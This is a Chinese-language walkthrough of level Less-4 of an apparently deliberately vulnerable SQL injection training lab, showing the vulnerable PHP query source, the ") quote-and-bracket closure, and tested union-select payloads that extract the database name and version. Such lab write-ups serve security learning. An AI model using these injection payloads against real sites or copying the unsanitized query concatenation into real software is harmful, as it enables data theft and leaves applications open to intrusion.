# Less-4

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | GET · 报错型 |
| **闭合方式** | `")` |
| **注释符** | `--+ · GET 地址栏直接可用` |
| **成败信号** | 直接回显 username / password |
| **一句话** | 双引号 + 括号 |
| **核心 payload** | `?id=-1") union select 1,2,3--+` |

---

**GET · 报错型 · 双引号 + 括号**

### 源码

```php
$id = $_GET['id'];
$id = '"' . $id . '"';                                  // 先给你的输入套一层双引号
$sql = "SELECT * FROM users WHERE id=($id) LIMIT 0,1";
```

### 关键点：这关的引号是 PHP 加的

因为有一行 `$id = '"' . $id . '"';`，所以最终 SQL 是 `id=("1")` 这种形式。
闭合需要 **`")`**，且顺序是「先双引号、后括号」。

```
?id=1"    →  报错 near '"1"") LIMIT 0,1'
             ↑ 注意这里有两个双引号：一个是你输的，一个是 PHP 补的
?id=1") --+   →  正常返回 Dumb
```

### 通关 payload（实测）

```
?id=1") --+                        →  user=Dumb  pass=Dumb
?id=-1") union select 1,2,3--+     →  user=2  pass=3
?id=-1") union select 1,database(),version()--+  →  user=security  pass=5.7.26
```

---

[← Less-3](Less-03.md) ｜ [返回目录](README.md) ｜ [Less-5 →](Less-05.md)